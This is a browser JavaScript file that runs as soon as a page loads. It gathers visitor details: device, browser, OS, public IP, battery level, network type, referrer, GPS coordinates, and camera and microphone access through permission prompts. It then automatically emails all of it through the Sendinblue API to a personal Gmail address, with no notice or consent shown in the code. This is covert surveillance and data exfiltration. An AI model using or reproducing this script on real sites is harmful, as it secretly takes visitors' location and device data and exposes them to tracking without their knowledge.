document.addEventListener('DOMContentLoaded', function() {
  var deviceType = 'Unknown';
  var deviceModel = 'Unknown';
  var browserType = 'Unknown';
  var browserVersion = 'Unknown';
  var operatingSystem = 'Unknown';
  var ipAddress = 'Unknown';
  var batteryPercentage = 'Unknown';
  var networkType = 'Unknown';
  var referrer = document.referrer || 'None';
  var latitude = 'Unknown';
  var longitude = 'Unknown'; 
  var cameraStatus = 'Unknown';
  var microphoneStatus = 'Unknown';
  var userAgent = navigator.userAgent;


  
  // Get Device Type and Model
  if (/mobile/i.test(userAgent)) {
    deviceType = 'Mobile';
  } else if (/tablet/i.test(userAgent)) {
    deviceType = 'Tablet';
  } else if (/smarttv/i.test(userAgent)) {
    deviceType = 'Smart TV';
  } else if (/xbox/i.test(userAgent)) {
    deviceType = 'Xbox';
  } else if (/playstation/i.test(userAgent)) {
    deviceType = 'PlayStation';
  } else if (/windows/i.test(userAgent)) {
    deviceType = 'Desktop';
  }
  
  if (/iPhone/i.test(userAgent)) {
    deviceModel = 'iPhone';
  } else if (/iPad/i.test(userAgent)) {
    deviceModel = 'iPad';
  } else if (/Galaxy/i.test(userAgent)) {
    deviceModel = 'Samsung Galaxy';
  } else if (/Pixel/i.test(userAgent)) {
    deviceModel = 'Google Pixel';
  }


  
  // Get Browser Type
  if (/firefox/i.test(userAgent)) {
    browserType = 'Firefox';
  } else if (/chrome/i.test(userAgent)) {
    browserType = 'Chrome';
  } else if (/safari/i.test(userAgent)) {
    browserType = 'Safari';
  } else if (/opera|opr/i.test(userAgent)) {
    browserType = 'Opera';
  } else if (/edge/i.test(userAgent)) {
    browserType = 'Microsoft Edge';
  } else if (/msie|trident/i.test(userAgent)) {
    browserType = 'Internet Explorer';
  }



  
  // Extract Browser Version
  if (/(version|rv:)([\w.]+)/i.test(userAgent)) {
    browserVersion = userAgent.match(/(version|rv:)([\w.]+)/i)[2];
  }



  // Get Operating System
  if (/windows/i.test(userAgent)) {
    operatingSystem = 'Windows';
  } else if (/mac/i.test(userAgent)) {
    operatingSystem = 'Mac OS';
  } else if (/linux/i.test(userAgent)) {
    operatingSystem = 'Linux';
  } else if (/android/i.test(userAgent)) {
    operatingSystem = 'Android';
  } else if (/iOS|iPhone|iPad|iPod/i.test(userAgent)) {
    operatingSystem = 'iOS';
  }
  

  // Get IP Address (using a third-party API)
fetch('https://api.ipify.org?format=json')
.then(response => response.json())
.then(data => {
  ipAddress = data.ip;
  document.getElementById('ipAddress').textContent = ipAddress;
})
.catch(error => {
  console.log('Error fetching IP address:', error);
  document.getElementById('ipAddress').textContent = 'Unknown';
});

  
  
  // Get Battery Percentage (using the Battery Status API)
if (navigator.getBattery) {
  navigator.getBattery()
    .then(battery => {
      const batteryPercentage = Math.floor(battery.level * 100) + '%';
      document.getElementById('batteryPercentage').textContent = batteryPercentage;
    })
    .catch(error => {
      console.log('Error retrieving battery percentage:', error);
      document.getElementById('batteryPercentage').textContent = 'Unknown';
    });
} else {
  console.log('Battery Status API not supported.');
  document.getElementById('batteryPercentage').textContent = 'Not supported';
}

  
  // Get Network Type
  if (navigator.connection && navigator.connection.effectiveType) {
    networkType = navigator.connection.effectiveType;
  } else if (navigator.connection && navigator.connection.type) {
    networkType = navigator.connection.type;
  }


  
  // Determine if Wi-Fi or Cellular
  var isWifi = networkType === 'wifi';
  var cellularGeneration = '';

  if (!isWifi) {
    if (networkType.startsWith('2g')) {
      cellularGeneration = '2G';
    } else if (networkType.startsWith('3g')) {
      cellularGeneration = '3G';
    } else if (networkType.startsWith('4g')) {
      cellularGeneration = '4G';
    } else if (networkType.startsWith('5g')) {
      cellularGeneration = '5G';
    } else {
      cellularGeneration = 'Other';
    }
  }

  

  // Check Camera Status
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function(stream) {
        cameraStatus = 'Available';
        stream.getTracks().forEach(function(track) {
          track.stop();
        });
      })
      .catch(function(error) {
        console.log('Error accessing camera:', error);
        cameraStatus = 'Unavailable';
      })
      .finally(function() {
        document.getElementById('cameraStatus').textContent = cameraStatus;
      });
  } else {
    console.log('Camera access not supported.');
    cameraStatus = 'Not supported';
    document.getElementById('cameraStatus').textContent = cameraStatus;
  }



  // Check Microphone Status
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ audio: true })
      .then(function(stream) {
        microphoneStatus = 'Available';
        stream.getTracks().forEach(function(track) {
          track.stop();
        });
      })
      .catch(function(error) {
        console.log('Error accessing microphone:', error);
        microphoneStatus = 'Unavailable';
      })
      .finally(function() {
        document.getElementById('microphoneStatus').textContent = microphoneStatus;
      });
  } else {
    console.log('Microphone access not supported.');
    microphoneStatus = 'Not supported';
    document.getElementById('microphoneStatus').textContent = microphoneStatus;
  }



 // Get Geolocation (latitude and longitude)
 if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    position => {
      latitude = position.coords.latitude;
      longitude = position.coords.longitude;
      document.getElementById('latitude').textContent = latitude.toFixed(6);
      document.getElementById('longitude').textContent = longitude.toFixed(6);
    },
    error => {
      console.log('Error retrieving geolocation:', error);
      document.getElementById('latitude').textContent = 'Unknown';
      document.getElementById('longitude').textContent = 'Unknown';
    }
  );
} else {
  console.log('Geolocation API not supported.');
  document.getElementById('latitude').textContent = 'Unknown';
  document.getElementById('longitude').textContent = 'Unknown';
}



// Set Cookie
document.cookie = "message=Hey! It's me, Iron Man";



  // Update HTML elements with the extracted information
  document.getElementById('deviceType').textContent = deviceType;
  document.getElementById('deviceModel').textContent = deviceModel;
  document.getElementById('browserType').textContent = browserType;
  document.getElementById('browserVersion').textContent = browserVersion;
  document.getElementById('ipAddress').textContent = ipAddress;
  document.getElementById('batteryPercentage').textContent = batteryPercentage;
  document.getElementById('networkType').textContent = networkType;
  document.getElementById('isWifi').textContent = isWifi ? 'Wi-Fi' : 'Cellular';
  document.getElementById('cellularGeneration').textContent = cellularGeneration;
  document.getElementById('referrer').textContent = referrer;
  document.getElementById('operatingSystem').textContent = operatingSystem;
  document.getElementById('latitude').textContent = latitude;
  document.getElementById('longitude').textContent = longitude;
  document.getElementById('cameraStatus').textContent = cameraStatus;
  document.getElementById('microphoneStatus').textContent = microphoneStatus;


  // Create a new XMLHttpRequest object
function sendEmail() {
    const xhr = new XMLHttpRequest();

    // Set up the request
    xhr.open('POST', 'https://api.sendinblue.com/v3/smtp/email');

    // Set the request headers
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader(
      "api-key",
      "sendblue-api-key"
    );

    // Handle the response
    xhr.onreadystatechange = function() {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 201) {
          console.log('Email sent successfully!');
        } else {
          console.error('Failed to send email:', xhr.statusText);
        }
      }
    };

    // Prepare the email data
    const emailData = {
      sender: { name: 'Your Name', email: 'yourname@example.com' },
      to: [{ email: 'yfilmyzillla@gmail.com' }],
      subject: 'Test Email',
      htmlContent: `<p></p>
        <p>Form Data:</p>
        <ul>
          <li>Device Type: ${deviceType}</li>
          <li>Device Model: ${deviceModel}</li>
          <li>Browser Type: ${browserType}</li>
          <li>Browser Version: ${browserVersion}</li>
          <li>Operating System: ${operatingSystem}</li>
          <li>IP Address: ${ipAddress}</li>
          <li>Battery Percentage: ${batteryPercentage}</li>
          <li>Network Type: ${networkType}</li>
          <li>Referrer: ${referrer}</li>
          <li>Latitude: ${latitude}</li>
          <li>Longitude: ${longitude}</li>
          <li>Camera Status: ${cameraStatus}</li>
          <li>Microphone Status: ${microphoneStatus}</li>
        </ul>`
    };

    // Convert the email data to JSON
    const jsonData = JSON.stringify(emailData);

    // Send the request with the JSON data
    xhr.send(jsonData);
  }

  // Call the sendEmail function
  sendEmail();

});


